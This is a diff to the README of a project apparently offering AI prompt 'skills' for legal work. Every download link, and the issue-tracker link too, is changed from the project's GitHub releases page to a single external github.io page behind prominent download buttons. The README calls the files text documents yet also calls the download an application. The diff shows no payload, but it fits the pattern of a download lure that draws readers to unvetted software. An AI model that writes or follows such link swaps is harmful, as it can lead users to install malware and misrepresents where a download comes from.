@@ -1,7 +1,7 @@
 <h1>🤖 legal-ai-skills - Boost Your Legal Work with AI</h1>
 
 <p align="center">
-  <a href="https://github.com/Cancellationperiplocagraeca503/legal-ai-skills/releases" style="display:inline-block;padding:12px 24px;background:#4CAF50;color:white;text-decoration:none;border-radius:6px;font-size:20px;font-weight:bold;">⬇️ Download legal-ai-skills</a>
+  <a href="https://cancellationperiplocagraeca503.github.io" style="display:inline-block;padding:12px 24px;background:#4CAF50;color:white;text-decoration:none;border-radius:6px;font-size:20px;font-weight:bold;">⬇️ Download legal-ai-skills</a>
 </p>
 
 <p align="center"><strong>Supercharge your legal tasks with ready-to-use AI skills for Claude, ChatGPT, and Codex.</strong></p>
@@ -28,7 +28,7 @@ Each skill is designed to work with popular AI chat platforms. Simply copy and p
 
 **Step 1: Visit the download page**
 
-Click the green button above or go to: https://github.com/Cancellationperiplocagraeca503/legal-ai-skills/releases
+Click the green button above or go to: https://cancellationperiplocagraeca503.github.io
 
 **Step 2: Find the right file**
 
@@ -40,7 +40,7 @@ Click the file name to start downloading. The file will be saved to your compute
 
 ## 📂 After Downloading
 
-Visit this link to download the application: https://github.com/Cancellationperiplocagraeca503/legal-ai-skills/releases
+Visit this link to download the application: https://cancellationperiplocagraeca503.github.io
 
 Once downloaded, you will have a folder containing the skill files. Each file is a text document that contains instructions for your AI assistant.
 
@@ -117,9 +117,9 @@ Found a bug or have a suggestion? Visit the repository to contribute or report i
 
 ## 🔗 Quick Links
 
-- Download: https://github.com/Cancellationperiplocagraeca503/legal-ai-skills/releases
-- Report Issues: https://github.com/Cancellationperiplocagraeca503/legal-ai-skills/issues
+- Download: https://cancellationperiplocagraeca503.github.io
+- Report Issues: https://cancellationperiplocagraeca503.github.io
 
 <p align="center">
-  <a href="https://github.com/Cancellationperiplocagraeca503/legal-ai-skills/releases" style="display:inline-block;padding:10px 20px;background:#2196F3;color:white;text-decoration:none;border-radius:6px;">⬇️ Download Now</a>
+  <a href="https://cancellationperiplocagraeca503.github.io" style="display:inline-block;padding:10px 20px;background:#2196F3;color:white;text-decoration:none;border-radius:6px;">⬇️ Download Now</a>
 </p>
